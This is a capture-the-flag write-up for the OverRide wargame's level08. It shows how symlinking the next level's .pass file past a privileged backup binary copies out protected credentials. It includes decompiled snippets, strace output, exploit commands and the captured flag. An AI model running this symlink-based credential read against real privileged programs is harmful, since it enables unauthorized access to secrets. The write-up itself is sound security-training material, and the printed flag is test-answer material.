
# Symbolic open

## Program summary
This program takes a file name as a parameter, opens a logs file **`pFVar3 = fopen("./backups/.log","w");`** , and the file passed in argv[1] **`__stream = fopen((char *)param_2[1],"r");`**.

Subsequently it will concatenate the string "./backups/" with our argv[1], and perform an open on it again **`__fd =  open((char  *)&local_78,0xc1,0x1b0);`**, what happens is that the first file will become the source of a file copy the one that has just been concatenated.


## Vulnerability

The vulnerability lies in the fact that the program has the necessary privileges to access the next level, in other words we can for example create a symbolic link to the **`.pass`** and pass this to it as a parameter.

Our difficulty lies in creating the right files in the right places, because if you notice it in the present folder it is impossible to create or modify them. This is not a problem, just place yourself in a folder like **`/tmp`**, in this we have the necessary rights, and the program will adapt to our current directory.

## Attack design
Tree of files :
```
/tmp
└── backups
	├── boom <- symbolic link to cat /home/users/level09/.pass
    └── backups
	    ├── EMPTY FOLDER
```
You do not need to create the file in **`./backups/backups`**, because as you can see it will be automatically generated with **O_CREAT**.
```
level08@OverRide:/tmp$ strace -e open /home/users/level08/level08 "backups/boom"
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
open("./backups/.log", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
open("backups/boom", O_RDONLY) = -1 EACCES (Permission denied)
ERROR: Failed to open backups/boom
```

```
/home/users/level08/level08 "backups/boom"
cat /tmp/backups/backups/boom
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

> Flag :  `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
